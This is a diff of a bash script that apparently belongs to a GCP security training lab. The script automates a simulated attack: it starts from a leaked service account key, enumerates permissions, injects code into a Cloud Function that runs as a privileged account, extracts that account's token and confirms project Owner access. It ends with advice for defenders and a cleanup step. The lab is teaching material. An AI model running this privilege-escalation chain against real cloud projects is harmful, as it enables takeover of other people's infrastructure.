@@ -43,16 +43,15 @@ spin_start() {
 spin_stop() { [ -n "${SPIN_PID}" ] && kill "${SPIN_PID}" >/dev/null 2>&1 || true; SPIN_PID=""; printf "\r%*s\r" 120 ""; }
 
 banner() {
-  printf "%s%s%s\n" "${BOLD}${CYAN}" "===            StreamGoat - Scenario 3              ===" "${RESET}"
+  printf "%s%s%s\n" "${BOLD}${CYAN}" "===          CDRGoat GCP - Scenario 3                ===" "${RESET}"
   printf "%sThis automated attack script will:%s\n" "${GREEN}" "${RESET}"
   printf "  • Step 1. Simulated Key Compromise & Auth\n"
-  printf "  • Step 2. Permission enumeration for stolen metadata\n"
+  printf "  • Step 2. Permission enumeration for stolen key\n"
   printf "  • Step 3. Enumerate Service Accounts and Custom Roles\n"
   printf "  • Step 4. Cloud Functions Enumeration & Source Extraction\n"
-  printf "  • Step 5. Replace Code & Trigger Enumeration Function\n"
+  printf "  • Step 5. Code Injection & Privilege Escalation\n"
   printf "  • Step 6. Post-Exploitation Privilege Review\n"
-  printf "  • Step 7. Removing items we created during compromitation (metadata, cloud function, local temporary files)\n"
-
+  printf "  • Step 7. Cleanup\n"
 }
 banner
 
@@ -147,7 +146,21 @@ ENVFILE="/tmp/.streamgoat/${CFG}.env"
 
 chmod 600 "$ENVFILE"
 ok "Environment config saved at ${YELLOW}${ENVFILE}${RESET}"
-printf "Local environment variables are set. We can now use the gcloud CLI or send curl requests directly to the cloud provider.\n"
+
+#############################################
+# Operator explanation
+#############################################
+printf "\n%s%s%s\n\n" "${BOLD}" "---  OPERATOR EXPLANATION  ---" "${RESET}"
+printf "We simulated a ${MAGENTA}service account key compromise${RESET} — a common attack vector where:\n"
+printf "  • Keys are leaked via source code repositories (GitHub, GitLab)\n"
+printf "  • Keys are found in CI/CD pipeline configurations\n"
+printf "  • Keys are exposed through misconfigured storage buckets\n"
+printf "  • Keys are obtained through phishing or social engineering\n\n"
+printf "Service account keys are long-lived credentials that don't require MFA.\n"
+printf "Unlike user accounts, compromised SA keys provide persistent access until\n"
+printf "the key is explicitly revoked.\n\n"
+printf "We authenticated using the leaked key and can now interact with GCP APIs.\n\n"
+
 read -r -p "Step 1 is completed. Press Enter to proceed (or Ctrl+C to abort)..." _ || true
 
 ################################################################################
@@ -174,7 +187,7 @@ try() {
   fi
 }
 
-printf "Running basic list requests to gather initial reconnaissance on our available privileges.\n\n"
+step "Running basic list requests for reconnaissance"
 
 source $ENVFILE
 
@@ -190,8 +203,18 @@ try "Pubsub: list topics" gcloud pubsub topics list
 try "BigQuery: list datasets" gcloud bigquery datasets list
 try "CloudSQL: list sql instances" gcloud sql instances list
 
+#############################################
+# Operator explanation
+#############################################
+printf "\n%s%s%s\n\n" "${BOLD}" "---  OPERATOR EXPLANATION  ---" "${RESET}"
+printf "Initial reconnaissance revealed limited but interesting permissions:\n"
+printf "  • ${GREEN}[OK]${RESET} IAM: list service accounts\n"
+printf "  • ${GREEN}[OK]${RESET} Cloud Functions: list functions\n"
+printf "  • ${GREEN}[OK]${RESET} Storage: list buckets\n\n"
+printf "The ability to enumerate IAM resources is particularly valuable.\n"
+printf "We can discover other service accounts, custom roles, and potentially\n"
+printf "find a path to privilege escalation.\n\n"
 
-printf "\nDuring reconnaissance and initial privilege enumeration, we detected some level of access to the IAM service. Let's dig deeper and see if we can extract more information from it.\n"
 read -r -p "Step 2 is completed. Press Enter to proceed (or Ctrl+C to abort)..." _ || true
 
 #############################################
@@ -251,9 +274,21 @@ else
   err "Cannot read IAM policy (missing resourcemanager.projects.getIamPolicy). Skipping role bindings."
 fi
 
-printf "\nWe couldn't collect all IAM policy information we wanted, but the data we did gather is still valuable: 4 custom service accounts and a permission list set on the service account we control (${YELLOW}streamgoat-sa-maintainer${RESET}). The account ${YELLOW}streamgoat-sa-fulladmin${RESET} looks potentially interesting for privilege escalation. Notably, it has permissions like ${CYAN}cloudfunctions.functions.update${RESET} and ${CYAN}storage.objects.create${RESET}. If we can find a Cloud Function and bucket we can write to, we might be able to escalate our privileges.\n"
+#############################################
+# Operator explanation
+#############################################
+printf "\n%s%s%s\n\n" "${BOLD}" "---  OPERATOR EXPLANATION  ---" "${RESET}"
+printf "We enumerated service accounts and discovered their custom roles:\n\n"
+printf "  • ${YELLOW}streamgoat-sa-maintainer${RESET}: Our controlled service account\n"
+printf "  • ${YELLOW}streamgoat-sa-fulladmin${RESET}: Potentially privileged account\n\n"
+printf "Key permissions discovered on our account:\n"
+printf "  • ${CYAN}cloudfunctions.functions.update${RESET}: Modify function code\n"
+printf "  • ${CYAN}storage.objects.create${RESET}: Upload objects to buckets\n"
+printf "  • ${CYAN}iam.serviceAccounts.actAs${RESET}: Impersonate service accounts\n\n"
+printf "This combination is dangerous — if we find a Cloud Function that runs as\n"
+printf "${YELLOW}streamgoat-sa-fulladmin${RESET}, we can inject code and escalate privileges.\n\n"
 
-read -r -p "Step 3 complete. Press Enter to proceed (or Ctrl+C to abort)..." _ || true
+read -r -p "Step 3 is completed. Press Enter to proceed (or Ctrl+C to abort)..." _ || true
 
 #############################################
 # Step 4. Cloud Functions Enumeration & Source Extraction
@@ -337,9 +372,22 @@ else
   fi
 fi
 
-printf "\nExcellent! We discovered the function ${YELLOW}'streamgoat-calc-function'${RESET} and a bucket we can write to in order to upload our malicious code for privilege escalation. This demonstrates how function code updates work in GCP. We also observe that this function runs as the privileged ${CYAN}'streamgoat-sa-fulladmin'${RESET} service account. Normally, without ${YELLOW}'iam.serviceAccounts.actAs'${RESET}, we couldn't update the function's code — a security control by GCP — but fortunately, our compromised service account has that permission.\n"
+#############################################
+# Operator explanation
+#############################################
+printf "\n%s%s%s\n\n" "${BOLD}" "---  OPERATOR EXPLANATION  ---" "${RESET}"
+printf "We discovered a Cloud Function and a writable bucket:\n\n"
+printf "  • Function: ${YELLOW}streamgoat-calc-function${RESET}\n"
+printf "  • Service Account: ${CYAN}streamgoat-sa-fulladmin${RESET}\n"
+printf "  • Writable Bucket: ${YELLOW}${STREAMGOAT_BUCKET}${RESET}\n\n"
+printf "GCP Cloud Functions deployment flow:\n"
+printf "  1. Code is uploaded to a GCS bucket as a ZIP archive\n"
+printf "  2. Function is updated to point to the new source archive\n"
+printf "  3. Function runs with the attached service account's permissions\n\n"
+printf "With ${MAGENTA}cloudfunctions.functions.update${RESET} + ${MAGENTA}iam.serviceAccounts.actAs${RESET},\n"
+printf "we can replace the function's code while keeping its privileged identity.\n\n"
 
-read -r -p "Step 4 complete. Press Enter to proceed (or Ctrl+C to abort)..." _ || true
+read -r -p "Step 4 is completed. Press Enter to proceed (or Ctrl+C to abort)..." _ || true
 
 #############################################
 # Step 5. Replace Code & Trigger Enumeration Function
@@ -439,9 +487,20 @@ RESPONSE=$(curl -s -H "Authorization: Bearer $ID_TOKEN" "$TRIGGER_URL")
 
 echo -e "${GREEN}[+] Function Response:${RESET}\n$RESPONSE"
 
-printf "We successfully received the token for the service account ${YELLOW}'streamgoat-sa-fulladmin'${RESET}. Let's verify what roles are assigned to it.\n"
+#############################################
+# Operator explanation
+#############################################
+printf "\n%s%s%s\n\n" "${BOLD}" "---  OPERATOR EXPLANATION  ---" "${RESET}"
+printf "We successfully executed our injected code and obtained:\n"
+printf "  • Service Account identity of the function\n"
+printf "  • Access token with the function's permissions\n\n"
+printf "The injected function accesses the metadata server from inside the\n"
+printf "Cloud Functions runtime environment. This is similar to how attackers\n"
+printf "steal credentials from compromised serverless workloads.\n\n"
+printf "We now have an access token for ${YELLOW}'streamgoat-sa-fulladmin'${RESET}.\n"
+printf "Next: Verify what IAM roles this privileged account has.\n\n"
 
-read -r -p "Step 5 complete. Press Enter to continue (or Ctrl+C to abort)..." _ || true
+read -r -p "Step 5 is completed. Press Enter to proceed (or Ctrl+C to abort)..." _ || true
 
 #############################################
 # Step 6. Post-Exploitation Privilege Review
@@ -483,17 +542,52 @@ jq -r --arg sa "serviceAccount:$FULLADMIN_SA" '
   "- Role: \(.role)"
 ' $TMP_DIR/iam_policy.json ${RESET}|| err "No roles found or invalid policy format"
 
-printf "\nGreat! We've confirmed that the service account ${YELLOW}'streamgoat-sa-fulladmin'${RESET} is privileged - we now have control over the entire project.\n"
+#############################################
+# Operator explanation
+#############################################
+printf "\n%s%s%s\n\n" "${BOLD}" "---  OPERATOR EXPLANATION  ---" "${RESET}"
+printf "We confirmed ${YELLOW}'streamgoat-sa-fulladmin'${RESET} has ${RED}Owner${RESET} or equivalent\n"
+printf "privileged role on the project.\n\n"
+printf "By injecting code into a Cloud Function that runs as this privileged SA,\n"
+printf "we effectively gained Owner-level access to the entire GCP project.\n\n"
+printf "This attack demonstrates the danger of:\n"
+printf "  • Overprivileged service accounts on Cloud Functions\n"
+printf "  • Granting ${CYAN}iam.serviceAccounts.actAs${RESET} without careful scoping\n"
+printf "  • Allowing function code updates without audit controls\n\n"
 
-read -rp "Step 6 complete. Press Enter to proceed..."
+read -r -p "Step 6 is completed. Press Enter to proceed (or Ctrl+C to abort)..." _ || true
+
+################################################################################
+# Final Summary
+################################################################################
+printf "\n%s%s%s\n" "${BOLD}${CYAN}" "===  Attack Simulation Complete  ===" "${RESET}"
+
+printf "\n%s%s%s\n" "${BOLD}${GREEN}" "Attack chain executed:" "${RESET}"
+printf "  1. Obtained compromised service account key (simulated leak)\n"
+printf "  2. Enumerated permissions across GCP services\n"
+printf "  3. Discovered service accounts and their custom roles\n"
+printf "  4. Found Cloud Function running as privileged SA\n"
+printf "  5. Injected malicious code to extract runtime credentials\n"
+printf "  6. Verified Owner-level access on the project\n\n"
+
+printf "%s%s%s\n" "${BOLD}${RED}" "Impact:" "${RESET}"
+printf "  • Full project Owner access achieved\n"
+printf "  • Ability to access/modify all resources\n"
+printf "  • Can create/delete resources, modify IAM policies\n\n"
+
+printf "%s\n" "Defenders should monitor for:"
+printf "  • Service account key creation and usage anomalies\n"
+printf "  • Cloud Function code updates (sourceArchiveUrl changes)\n"
+printf "  • Metadata server access from Cloud Functions\n"
+printf "  • IAM policy reads from non-admin service accounts\n\n"
 
 #############################################
 # Step 7. Cleanup
 #############################################
 
-printf "\n%s%s%s\n" "${BOLD}${CYAN}" "===  Step 7. Removing items we created during compromitation (metadata, cloud function, local temporary files)  ===" "${RESET}"
+printf "\n%s%s%s\n" "${BOLD}${CYAN}" "===  Step 7. Cleanup  ===" "${RESET}"
 
 set +e
-step "Removing localy stored file in /tmp/.streamgoat"
+step "Removing locally stored files in /tmp/.streamgoat"
 rm -rf /tmp/.streamgoat
 set -e
